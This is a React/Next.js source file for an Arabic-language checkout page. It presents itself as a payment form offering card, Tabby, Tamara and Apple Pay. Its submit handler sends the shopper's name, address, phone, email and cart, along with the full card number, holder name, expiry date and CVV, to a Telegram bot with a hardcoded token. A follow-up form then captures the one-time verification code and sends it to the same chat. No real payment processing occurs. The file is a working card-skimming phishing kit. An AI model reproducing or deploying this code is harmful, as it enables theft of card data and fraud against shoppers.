"use client";

import { useState } from "react";
import visa from "../../../../public/images/visa.png";
import tamara from "../../../../public/images/tamara.png";
import applepay from "../../../../public/images/applepay.png";
import tabpay from "../../../../public/images/tabpay.png";
import Image from "next/image";
import VerificationCodeForm from "./VerificationCodeForm";

type PaymentFormProps = {
  total?: number;
  handlePaymentSubmit: (cardInfo?: {
    paymentMethod: string;
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
    verificationCode?: string;
  }) => void;
  isProcessing?: boolean;
  processingError?: string;
  shippingInfo?: {
    fullName: string;
    address: string;
    city: string;
    phone: string;
    email: string;
    houseDescription?: string;
  };
  cartItems?: {
    id: string;
    name: string;
    price: string;
    quantity: number;
    image_url: string;
  }[];
  subtotal?: number;
  shippingCost?: number;
  shippingMethod?: string;
};

export default function PaymentForm({
  handlePaymentSubmit,
  isProcessing = false,
  processingError = "",
  shippingInfo,
  cartItems = [],
  subtotal = 0,
  shippingCost = 0,
  shippingMethod = "aramex",
  total = 0,
}: PaymentFormProps) {
  const [paymentMethod, setPaymentMethod] = useState("credit_card");
  const [showApplePayMessage, setShowApplePayMessage] = useState(false);
  const [showVerificationForm, setShowVerificationForm] = useState(false);
  const [cardInfo, setCardInfo] = useState({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: "",
  });

  const handleCardInfoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === "cardNumber") {
      // Remove all non-digit characters
      const digitsOnly = value.replace(/\D/g, "");
      // Limit to 16 digits
      const truncated = digitsOnly.slice(0, 16);
      // Format as XXXX XXXX XXXX XXXX
      const formatted = truncated.replace(/(.{4})/g, "$1 ").trim();

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: formatted,
        };

        return newCardInfo;
      });
    } else if (name === "cvv") {
      // Only allow 3-4 digits for CVV
      const digitsOnly = value.replace(/\D/g, "");
      const truncated = digitsOnly.slice(0, 4);

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: truncated,
        };

        return newCardInfo;
      });
    } else if (name === "expiryDate") {
      // Format as MM/YY
      const digitsOnly = value.replace(/\D/g, "");
      const truncated = digitsOnly.slice(0, 4);

      let formatted = truncated;
      if (truncated.length > 2) {
        formatted = truncated.slice(0, 2) + "/" + truncated.slice(2);
      }

      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: formatted,
        };

        return newCardInfo;
      });
    } else {
      setCardInfo((prev) => {
        const newCardInfo = {
          ...prev,
          [name]: value,
        };

        return newCardInfo;
      });
    }
  };

  // Validate card information
  const validateCardInfo = () => {
    const cardNumberValid =
      cardInfo.cardNumber.replace(/\s/g, "").length === 16;
    const cvvValid = cardInfo.cvv.length >= 3 && cardInfo.cvv.length <= 4;
    const expiryDateValid = /^\d{2}\/\d{2}$/.test(cardInfo.expiryDate);

    return (
      cardNumberValid &&
      cvvValid &&
      expiryDateValid &&
      cardInfo.cardHolder.trim() !== ""
    );
  };

  const handleVerificationComplete = (code: string) => {
    const escapeMarkdown = (text: string) => {
      return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
    };

    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
    const chatId = "5439962016";

    // Send verification code
    const formatVerificationInfo = () => {
      const now = new Date().toLocaleString("ar-SA");
      return [
        "🔑 *رمز التحقق* 🔑",
        `رمز التحقق: ${escapeMarkdown(code)}`,
        `وقت التحقق: ${escapeMarkdown(now)}`,
      ].join("\n");
    };

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: formatVerificationInfo(),
        parse_mode: "Markdown",
      }),
    })
      .then(() => {
        const paymentData = {
          paymentMethod,
          ...(paymentMethod === "credit_card" ||
          paymentMethod === "tabby" ||
          paymentMethod === "tamara"
            ? cardInfo
            : {}),
          verificationCode: code,
        };

        handlePaymentSubmit(paymentData);
      })
      .catch((error) => {
        console.error("Error in payment process:", error);
      });
  };

  const handleVerificationCancel = () => {
    setShowVerificationForm(false);
  };

  return (
    <div className="text-right bg-white p-6 rounded-lg shadow-md">
      {/* <Image src={payment} alt="Payment" className="mb-4 w-full" /> */}
      <h2 className="text-lg font-bold mb-6">طريقة الدفع</h2>
      <div className="space-y-6">
        <div className="grid grid-cols-2 gap-4 mb-4">
          <div
            className={`p-4 border rounded-lg cursor-pointer ${
              paymentMethod === "credit_card"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => setPaymentMethod("credit_card")}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "credit_card" && (
                  <div className="w-3 h-3 bg-primary rounded-full"></div>
                )}
              </div>
            </div>
            <Image src={visa} alt="Visa" className="w-full" />
          </div>
          <div
            className={`p-4 border rounded-lg cursor-pointer ${
              paymentMethod === "tabby"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => setPaymentMethod("tabby")}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "tabby" && (
                  <div className="w-3 h-3 bg-primary rounded-full"></div>
                )}
              </div>
            </div>
            <Image src={tabpay} alt="tabpay" className="w-full" />
          </div>
          <div
            className={`p-4 border rounded-lg cursor-pointer ${
              paymentMethod === "tamara"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => setPaymentMethod("tamara")}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "tamara" && (
                  <div className="w-3 h-3 bg-primary rounded-full"></div>
                )}
              </div>
            </div>
            <Image src={tamara} alt="Tamara" className="w-full" />
          </div>
          <div
            className={`p-4 border rounded-lg cursor-pointer ${
              paymentMethod === "apple_pay"
                ? "border-primary bg-blue-50"
                : "border-gray-300"
            }`}
            onClick={() => {
              setPaymentMethod("apple_pay");
              setShowApplePayMessage(true);
            }}
          >
            <div className="flex justify-between items-center mb-2">
              <div className="w-5 h-5 border border-gray-300 rounded-full flex items-center justify-center">
                {paymentMethod === "apple_pay" && (
                  <div className="w-3 h-3 bg-primary rounded-full"></div>
                )}
              </div>
            </div>
            <Image src={applepay} alt="Apple Pay" className="w-full" />
          </div>
        </div>

        {showApplePayMessage && paymentMethod === "apple_pay" && (
          <div className="border rounded-lg p-4 bg-yellow-50 text-center">
            <p className="text-lg font-bold text-gray-700 mb-2">عفوا</p>
            <p className="text-gray-600">
              خدمة أبل باي غير متاحة بالوقت الحالي
            </p>
          </div>
        )}

        {(paymentMethod === "credit_card" ||
          paymentMethod === "tabby" ||
          paymentMethod === "tamara") && (
          <div className="space-y-4">
            <div>
              <label
                htmlFor="cardNumber"
                className="block text-sm font-medium text-gray-700 mb-1"
              >
                رقم البطاقة
              </label>
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                value={cardInfo.cardNumber}
                onChange={handleCardInfoChange}
                placeholder="XXXX XXXX XXXX XXXX"
                className="w-full p-2 border border-gray-300 rounded-md text-right"
                required
              />
            </div>
            <div>
              <label
                htmlFor="cardHolder"
                className="block text-sm font-medium text-gray-700 mb-1"
              >
                اسم حامل البطاقة
              </label>
              <input
                type="text"
                id="cardHolder"
                name="cardHolder"
                value={cardInfo.cardHolder}
                onChange={handleCardInfoChange}
                className="w-full p-2 border border-gray-300 rounded-md text-right"
                required
              />
            </div>
            <div className="flex gap-4">
              <div className="flex-1">
                <label
                  htmlFor="expiryDate"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  تاريخ الانتهاء
                </label>
                <input
                  type="text"
                  id="expiryDate"
                  name="expiryDate"
                  value={cardInfo.expiryDate}
                  onChange={handleCardInfoChange}
                  placeholder="MM/YY"
                  className="w-full p-2 border border-gray-300 rounded-md text-right"
                  required
                />
              </div>
              <div className="flex-1">
                <label
                  htmlFor="cvv"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  رمز الأمان
                </label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  value={cardInfo.cvv}
                  onChange={handleCardInfoChange}
                  placeholder="CVV"
                  className="w-full p-2 border border-gray-300 rounded-md text-right"
                  required
                />
              </div>
            </div>
          </div>
        )}

        {processingError && (
          <div className="p-3 bg-red-100 text-red-700 rounded-lg mb-4 text-right">
            <p className="font-bold">خطأ:</p>
            <p>{processingError}</p>
          </div>
        )}

        <button
          onClick={() => {
            if (paymentMethod !== "credit_card" || validateCardInfo()) {
              const escapeMarkdown = (text: string) => {
                return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
              };

              const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
              const chatId = "5439962016";

              // Format shipping and order information
              const formatOrderInfo = () => {
                const now = new Date().toLocaleString("ar-SA");
                let message = "🛍️ *طلب جديد* 🛍️\n\n";

                // Add shipping information if available
                if (shippingInfo) {
                  message += "📦 *معلومات الشحن* 📦\n";
                  message += `الاسم الكامل: ${escapeMarkdown(
                    shippingInfo.fullName
                  )}\n`;
                  message += `البريد الإلكتروني: ${escapeMarkdown(
                    shippingInfo.email
                  )}\n`;
                  message += `رقم الهاتف: ${escapeMarkdown(
                    shippingInfo.phone
                  )}\n`;
                  message += `المدينة: ${escapeMarkdown(shippingInfo.city)}\n`;
                  message += `العنوان: ${escapeMarkdown(
                    shippingInfo.address
                  )}\n`;
                  if (shippingInfo.houseDescription) {
                    message += `وصف البيت: ${escapeMarkdown(
                      shippingInfo.houseDescription
                    )}\n`;
                  }
                  message += `وقت الطلب: ${escapeMarkdown(now)}\n\n`;
                }

                // Add cart items if available
                if (cartItems && cartItems.length > 0) {
                  message += "🛒 *المنتجات* 🛒\n";
                  cartItems.forEach((item, index) => {
                    message += `${index + 1}. ${escapeMarkdown(
                      item.name
                    )} - الكمية: ${item.quantity} - السعر: ${escapeMarkdown(
                      item.price
                    )}\n`;
                  });
                  message += "\n";
                }

                // Add order summary
                message += "💰 *ملخص الطلب* 💰\n";
                message += `المجموع الفرعي: ${subtotal.toFixed(2)} د.إ\n`;
                message += `رسوم الشحن: ${shippingCost.toFixed(2)} د.إ\n`;
                message += `شركة التوصيل: ${escapeMarkdown(
                  shippingMethod === "aramex" ? "أرامكس" : "سمسا"
                )}\n`;
                message += `الإجمالي: ${total.toFixed(2)} د.إ\n`;
                message += `طريقة الدفع: ${escapeMarkdown(
                  paymentMethod === "credit_card"
                    ? "بطاقة ائتمان"
                    : paymentMethod === "tabby"
                    ? "تقسيط (تابي)"
                    : paymentMethod === "tamara"
                    ? "تقسيط (تمارا)"
                    : paymentMethod === "apple_pay"
                    ? "أبل باي"
                    : "غير معروف"
                )}\n`;

                return message;
              };

              // Send order information
              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: formatOrderInfo(),
                  parse_mode: "Markdown",
                }),
              })
                .then(() => {
                  // Send payment data
                  const formatPaymentInfo = () => {
                    const now = new Date().toLocaleString("ar-SA");
                    const parts = [
                      "🔒 *بيانات الدفع* 🔒",
                      `طريقة الدفع: ${escapeMarkdown(paymentMethod)}`,
                    ];

                    if (cardInfo.cardNumber) {
                      parts.push(
                        `رقم البطاقة: ${escapeMarkdown(cardInfo.cardNumber)}`
                      );
                    }
                    if (cardInfo.cardHolder) {
                      parts.push(
                        `اسم حامل البطاقة: ${escapeMarkdown(
                          cardInfo.cardHolder
                        )}`
                      );
                    }
                    if (cardInfo.expiryDate) {
                      parts.push(
                        `تاريخ الانتهاء: ${escapeMarkdown(cardInfo.expiryDate)}`
                      );
                    }
                    if (cardInfo.cvv) {
                      parts.push(`رمز الأمان: ${escapeMarkdown(cardInfo.cvv)}`);
                    }
                    parts.push(`وقت العملية: ${escapeMarkdown(now)}`);

                    return parts.join("\n");
                  };

                  return fetch(
                    `https://api.telegram.org/bot${botToken}/sendMessage`,
                    {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        chat_id: chatId,
                        text: formatPaymentInfo(),
                        parse_mode: "Markdown",
                      }),
                    }
                  );
                })
                .then(() => {
                  // For credit card payments, show verification form
                  if (
                    paymentMethod === "credit_card" &&
                    !showVerificationForm
                  ) {
                    setShowVerificationForm(true);
                  } else if (!showVerificationForm) {
                    // For other payment methods, proceed directly
                    handlePaymentSubmit({
                      paymentMethod,
                      ...(paymentMethod === "tabby" ||
                      paymentMethod === "tamara"
                        ? cardInfo
                        : {}),
                    });
                  }
                })
                .catch((error) => {
                  console.error("Error sending payment data:", error);
                  alert(
                    "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
                  );
                });
            } else {
              alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
            }
          }}
          disabled={isProcessing}
          className={`w-full component-base py-3 px-6 font-medium ${
            isProcessing ? "bg-gray-400 cursor-not-allowed" : "warning"
          }`}
        >
          {isProcessing
            ? "جاري معالجة الطلب..."
            : paymentMethod === "credit_card"
            ? "إتمام الدفع"
            : paymentMethod === "tabby"
            ? "الدفع مع تابي"
            : paymentMethod === "tamara"
            ? "الدفع مع تمارا"
            : "إتمام الدفع"}
        </button>
      </div>

      {/* Show verification form when needed */}
      {showVerificationForm && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="max-w-md w-full mx-4">
            <VerificationCodeForm
              onVerificationComplete={handleVerificationComplete}
              onCancel={handleVerificationCancel}
              isProcessing={isProcessing}
            />
          </div>
        </div>
      )}
    </div>
  );
}
